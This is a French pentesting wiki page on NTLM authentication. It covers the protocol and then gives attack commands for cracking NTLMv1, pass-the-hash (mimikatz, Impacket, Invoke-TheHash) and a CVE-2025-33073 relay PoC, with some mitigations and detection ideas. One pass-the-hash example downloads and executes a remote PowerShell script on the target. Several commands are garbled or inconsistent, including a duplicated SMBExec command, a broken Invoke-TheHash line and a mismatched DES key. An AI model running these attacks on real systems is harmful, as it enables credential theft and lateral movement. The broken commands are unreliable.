# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Informations de base

Dans les environnements où **Windows XP et Server 2003** sont utilisés, les hashes LM (Lan Manager) sont employés, bien qu'il soit largement reconnu qu'ils peuvent être facilement compromis. Un hash LM particulier, `AAD3B435B51404EEAAD3B435B51404EE`, indique que LM n'est pas utilisé et correspond au hash d'une chaîne vide.

Par défaut, le protocole d'authentification **Kerberos** est la méthode principale. NTLM (NT LAN Manager) intervient dans certaines circonstances : absence d'Active Directory, domaine inexistant, dysfonctionnement de Kerberos dû à une mauvaise configuration, ou tentatives de connexion utilisant une adresse IP plutôt qu'un nom d'hôte valide.

La présence de l'en-tête **"NTLMSSP"** dans les paquets réseau indique un processus d'authentification NTLM.

La prise en charge des protocoles d'authentification — LM, NTLMv1 et NTLMv2 — est assurée par une DLL spécifique située dans `%windir%\Windows\System32\msv1\_0.dll`.

**Points clés** :

- Les hashes LM sont vulnérables et un hash LM vide (`AAD3B435B51404EEAAD3B435B51404EE`) indique que LM n'est pas utilisé.
- Kerberos est la méthode d'authentification par défaut, NTLM n'étant utilisé que dans certaines circonstances.
- Les paquets d'authentification NTLM sont identifiables grâce à l'en-tête "NTLMSSP".
- Les protocoles LM, NTLMv1 et NTLMv2 sont pris en charge par le fichier système `msv1\_0.dll`.

## LM, NTLMv1 et NTLMv2

Vous pouvez vérifier et configurer le protocole qui sera utilisé :

### Interface graphique

Exécutez _secpol.msc_ -> Stratégies locales -> Options de sécurité -> Sécurité réseau : niveau d'authentification LAN Manager. Il existe 6 niveaux (de 0 à 5).

![LM, NTLMv1 et NTLMv2 - Interface graphique : exécutez secpol.msc - Stratégies locales - Options de sécurité - Sécurité réseau : niveau d'authentification LAN Manager. Il existe 6 niveaux (de 0 à 5)](<../../images/image (919).png>)

### Registre

Cela définira le niveau 5 :

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Valeurs possibles :

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

## Schéma d’authentification de domaine NTLM de base

1. L’**utilisateur** saisit ses **identifiants**
2. La machine cliente **envoie une requête d’authentification** avec le **nom de domaine** et le **nom d’utilisateur**
3. Le **serveur** envoie le **challenge**
4. Le **client chiffre** le **challenge** à l’aide du hash du mot de passe comme clé et l’envoie en réponse
5. Le **serveur envoie** au **contrôleur de domaine** le **nom de domaine, le nom d’utilisateur, le challenge et la réponse**. Si Active Directory n’est **pas** configuré ou si le nom de domaine est celui du serveur, les identifiants sont **vérifiés localement**.
6. Le **contrôleur de domaine vérifie que tout est correct** et envoie les informations au serveur

Le **serveur** et le **contrôleur de domaine** peuvent créer un **Secure Channel** via le serveur **Netlogon**, car le contrôleur de domaine connaît le mot de passe du serveur (il se trouve dans la base de données **NTDS.DIT**).

### Schéma d’authentification NTLM locale

L’authentification est identique à celle mentionnée **précédemment, mais** le **serveur** connaît le **hash de l’utilisateur** qui tente de s’authentifier, stocké dans le fichier **SAM**. Ainsi, au lieu d’interroger le contrôleur de domaine, le **serveur vérifie lui-même** si l’utilisateur peut s’authentifier.

### Challenge NTLMv1

La **longueur du challenge est de 8 octets** et celle de la **réponse est de 24 octets**.

Le **hash NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (7B + 7B + (2B+0x00\*5)) : la **dernière partie est remplie de zéros**. Ensuite, le **challenge** est **chiffré séparément** avec chaque partie, puis les octets chiffrés **obtenus** sont **concaténés**. Total : 8B + 8B + 8B = 24 octets.

**Problèmes** :

- Manque de **caractère aléatoire**
- Les 3 parties peuvent être **attaquées séparément** pour retrouver le hash NT
- **DES peut être cassé**
- La 3e clé est toujours composée de **5 zéros**.
- Avec le **même challenge**, la **réponse** sera **identique**. Vous pouvez donc envoyer à la victime la chaîne "**1122334455667788**" comme **challenge**, puis attaquer la réponse à l’aide de **tables arc-en-ciel pré-calculées**.

### Attaque NTLMv1

La délégation sans contrainte est moins courante dans les environnements modernes, mais un service **Print Spooler** accessible peut toujours être détourné pour forcer l’authentification vers un tel hôte.

Vous pouvez exploiter des identifiants/sessions auxquels vous avez déjà accès sur l’AD pour **demander à l’imprimante de s’authentifier** auprès d’un **hôte sous votre contrôle**. Ensuite, avec `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **configurer le challenge d’authentification sur 1122334455667788**, capturer la tentative d’authentification et, si elle utilise **NTLMv1**, vous pourrez **la casser**.\
Si vous utilisez `responder`, vous pouvez essayer d’**utiliser l’option `--lm`** pour tenter de **rétrograder** l’**authentification**.\
_Notez que pour cette technique, l’authentification doit utiliser NTLMv1 (NTLMv2 ne convient pas)._

N’oubliez pas que l’imprimante utilisera le compte de l’ordinateur lors de l’authentification, et que les comptes d’ordinateur ont des **mots de passe longs et aléatoires** que vous ne pourrez **probablement pas casser** à l’aide de **dictionnaires** classiques. Cependant, l’authentification **NTLMv1** utilise **DES** ([plus d’informations ici](#ntlmv1-challenge)) ; vous pourrez donc le casser à l’aide de services spécialement conçus pour casser DES (vous pouvez par exemple utiliser [https://crack.sh/](https://crack.sh) ou [https://ntlmv1.com/](https://ntlmv1.com)).

### Attaque NTLMv1 avec hashcat

NTLMv1 peut également être attaqué avec [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), qui convertit les messages NTLMv1 capturés en formats adaptés à Hashcat.<sup>[[1]](#references)</sup>

La commande

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

produirait le résultat ci-dessous :

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

Créez un fichier contenant :

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Exécutez hashcat (de préférence en distribué via un outil tel que hashtopolis), car cela prendrait plusieurs jours autrement.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Dans ce cas, nous savons que le mot de passe est « password », donc nous allons tricher pour les besoins de la démonstration :

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Nous devons maintenant utiliser les hashcat-utilities pour convertir les clés DES craquées en parties du hash NTLM :

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Enfin, la dernière partie :

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

Combinez-les :

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

### Défi NTLMv2

La **longueur du défi est de 8 octets** et **2 réponses sont envoyées** : l’une fait **24 octets** et la longueur de **l’autre** est **variable**.

**La première réponse** est créée en chiffrant avec **HMAC_MD5** la **chaîne** composée du **client et du domaine**, en utilisant comme **clé** le **hash MD4** du **hash NT**. Le **résultat** est ensuite utilisé comme **clé** pour chiffrer le **défi** avec **HMAC_MD5**. On y ajoute un défi client de 8 octets. Total : 24 o.

**La deuxième réponse** est créée à partir de **plusieurs valeurs** (un nouveau défi client, un **horodatage** pour éviter les **attaques par rejeu**...)

Si vous avez un **PCAP contenant un échange d’authentification réussi**, extrayez le domaine, le nom d’utilisateur, le défi du serveur et la réponse NTLMv2, formatez la capture pour Hashcat, puis utilisez le mode `5600` pour tenter de retrouver le mot de passe. Le tutoriel pratique archivé conserve la procédure d’extraction des champs du paquet, tandis que les exemples de Hashcat définissent le format actuellement accepté.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Une fois que vous avez le hash de la victime**, vous pouvez l’utiliser pour **usurper son identité**.\
Vous devez utiliser un **outil** qui effectuera l’**authentification NTLM avec** ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans **LSASS**. Ainsi, toute **authentification NTLM effectuée** utilisera ce **hash**. C’est ce que fait mimikatz.

**N’oubliez pas que vous pouvez également effectuer des attaques Pass-the-Hash avec des comptes d’ordinateur.**

### **Mimikatz**

**Doit être exécuté en tant qu’administrateur**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Cela lance un processus sous l’utilisateur local actuel, tandis que LSASS associe les identifiants fournis à sa connexion réseau sortante. Vous pouvez ensuite accéder aux ressources réseau en tant qu’utilisateur fourni, comme avec `runas /netonly`, sans connaître le mot de passe en clair.

### Pass-the-Hash depuis Linux

Vous pouvez obtenir l’exécution de code sur des machines Windows à l’aide de Pass-the-Hash depuis Linux.\
[**Voir des exemples pratiques d’exécution de Pass-the-Hash avec Impacket PsExec.**](../lateral-movement/psexec-and-winexec.md#impacket-psexecpy-psexec-like)

### Outils Windows compilés d’Impacket

Vous pouvez télécharger[ les binaires Impacket pour Windows ici](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Dans ce cas, vous devez spécifier une commande ; cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Il existe plusieurs autres binaires Impacket...

### Invoke-TheHash

Vous pouvez récupérer les scripts PowerShell ici : [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-WMIExec

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

#### Invoke-SMBClient

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

#### Invoke-SMBEnum

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

#### Invoke-TheHash

Cette fonction combine les modes précédents. Vous pouvez spécifier **plusieurs hôtes**, exclure certaines cibles et choisir _SMBExec, WMIExec, SMBClient,_ ou _SMBEnum_. Si vous sélectionnez **SMBExec** ou **WMIExec** sans paramètre _**Command**_, la fonction vérifie uniquement si vous disposez des autorisations suffisantes.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Doit être exécuté en tant qu’administrateur**

Cet outil fait la même chose que mimikatz (modifie la mémoire de LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

### Exécution à distance manuelle de Windows avec un nom d’utilisateur et un mot de passe


{{#ref}}
../lateral-movement/
{{#endref}}

## Extraction d’identifiants depuis un hôte Windows

Pour plus d’informations, consultez [**Vol d’identifiants Windows**](../stealing-credentials/README.md).

## Attaque Internal Monologue

L’Internal Monologue Attack est une technique furtive d’extraction d’identifiants qui permet à un attaquant de récupérer les hashes NTLM d’une machine victime **sans interagir directement avec le processus LSASS**. Contrairement à Mimikatz, qui lit les hashes directement depuis la mémoire et est souvent bloqué par les solutions de sécurité des terminaux ou Credential Guard, cette attaque exploite **des appels locaux au package d’authentification NTLM (MSV1_0) via l’interface Security Support Provider Interface (SSPI)**. L’attaquant commence par **abaisser les paramètres NTLM** (p. ex., LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) afin d’autoriser NetNTLMv1. Il usurpe ensuite les jetons d’utilisateurs existants obtenus à partir de processus en cours d’exécution et déclenche localement une authentification NTLM pour générer des réponses NetNTLMv1 à l’aide d’un challenge connu.<sup>[[4]](#references)</sup>

Après avoir capturé ces réponses NetNTLMv1, l’attaquant peut rapidement retrouver les hashes NTLM d’origine à l’aide de **rainbow tables précalculées**, ce qui permet de mener d’autres attaques Pass-the-Hash pour se déplacer latéralement. Il est important de noter que l’Internal Monologue Attack reste furtive, car elle ne génère pas de trafic réseau, n’injecte pas de code et ne déclenche pas de dump mémoire direct. Elle est donc plus difficile à détecter pour les défenseurs que les méthodes traditionnelles comme Mimikatz.

Si NetNTLMv1 n’est pas accepté en raison de règles de sécurité appliquées, l’attaquant risque de ne pas pouvoir récupérer de réponse NetNTLMv1.

Pour gérer ce cas, l’outil Internal Monologue a été mis à jour : il acquiert dynamiquement un jeton serveur avec `AcceptSecurityContext()` afin de pouvoir **capturer des réponses NetNTLMv2** si NetNTLMv1 échoue. Bien que NetNTLMv2 soit beaucoup plus difficile à cracker, il peut toujours ouvrir la voie à des attaques de relais ou à du brute-force hors ligne dans certains cas limités.

La PoC est disponible sur **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## Relais NTLM et Responder

**Consultez ici un guide plus détaillé sur la réalisation de ces attaques :**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Analyser les challenges NTLM à partir d’une capture réseau

**Vous pouvez utiliser** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## *Reflection* NTLM et Kerberos via des SPN sérialisés (CVE-2025-33073)

Windows comporte plusieurs mesures d’atténuation qui visent à empêcher les attaques de *reflection*, où une authentification NTLM (ou Kerberos) provenant d’un hôte est relayée vers ce **même** hôte afin d’obtenir des privilèges SYSTEM.  

Microsoft a cassé la plupart des chaînes publiques avec MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) et les correctifs ultérieurs. Cependant, **CVE-2025-33073** montre qu’il est toujours possible de contourner ces protections en exploitant la façon dont le **client SMB tronque les Service Principal Names (SPN)** contenant des informations de cible *marshalled* (sérialisées).<sup>[[5]](#references)[[6]](#references)</sup>

### Résumé du bug
1. Un attaquant enregistre un **enregistrement DNS A** dont le libellé encode un SPN *marshalled* – p. ex. :
   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. La victime est contrainte de s’authentifier auprès de ce nom d’hôte (PetitPotam, DFSCoerce, etc.).
3. Lorsque le client SMB transmet la chaîne cible `cifs/srv11UWhRCAAAAA…` à `lsasrv!LsapCheckMarshalledTargetInfo`, l’appel à `CredUnmarshalTargetInfo` **supprime** le blob sérialisé, ne laissant que **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ou l’équivalent Kerberos) considère alors la cible comme étant *localhost*, car la partie hôte raccourcie correspond au nom de l’ordinateur (`SRV1`).
5. Par conséquent, le serveur définit `NTLMSSP_NEGOTIATE_LOCAL_CALL` et injecte le **jeton d’accès SYSTEM de LSASS** dans le contexte (dans le cas de Kerberos, une clé de sous-session marquée SYSTEM est créée).
6. Le relais de cette authentification avec `ntlmrelayx.py` **ou** `krbrelayx.py` donne tous les droits SYSTEM sur le même hôte.<sup>[[5]](#references)</sup>

### PoC rapide
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
          -d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```

### Correctifs et mesures d’atténuation
* Le correctif KB pour **CVE-2025-33073** ajoute une vérification dans `mrxsmb.sys::SmbCeCreateSrvCall` qui bloque toute connexion SMB dont la cible contient des informations marshalées (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Appliquer la **signature SMB** aux destinations de relais SMB. Pour les autres destinations, évaluer les exigences de signature ou d’Extended Protection propres au protocole ainsi que son niveau de correctifs ; la signature SMB seule ne permet pas de déterminer si un relais HTTPS WinRM est possible.
* Surveiller les enregistrements DNS ressemblant à `*<base64>...*` et bloquer les vecteurs de coercition (PetitPotam, DFSCoerce, AuthIP...).

### Idées de détection
* Captures réseau contenant `NTLMSSP_NEGOTIATE_LOCAL_CALL` lorsque l’adresse IP du client ≠ celle du serveur.
* AP-REQ Kerberos contenant une clé de sous-session et un principal client égal au nom d’hôte.
* Ouvertures de session SYSTEM dans les journaux Windows, événements 4624/4648, immédiatement suivies d’écritures SMB à distance depuis le même hôte.<sup>[[5]](#references)</sup>

Un nom DNS d’informations de cible sérialisées peut aussi diriger une authentification forcée vers un attaquant pour un **relais interprotocoles** vers un point de terminaison d’inscription web AD CS. Il s’agit d’un résultat distinct de la réflexion sur le même hôte : les [conditions d’inscription ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), les droits d’écriture DNS, un chemin de coercition et le niveau de correctifs de la cible doivent être évalués indépendamment.

Pour la variante de réflexion locale de **mars 2026**, qui exploite des **ports SMB arbitraires** et la **réutilisation de connexions TCP** pour obtenir `NT AUTHORITY\SYSTEM`, voir :

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – Boîte à outils NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Exemples de hachages Hashcat – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – Utilitaires PowerShell Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Attaque Internal Monologue : récupérer des hachages NTLM sans toucher à LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [La réflexion NTLM est morte, vive la réflexion NTLM !](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Craquer un hachage NTLMv2 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
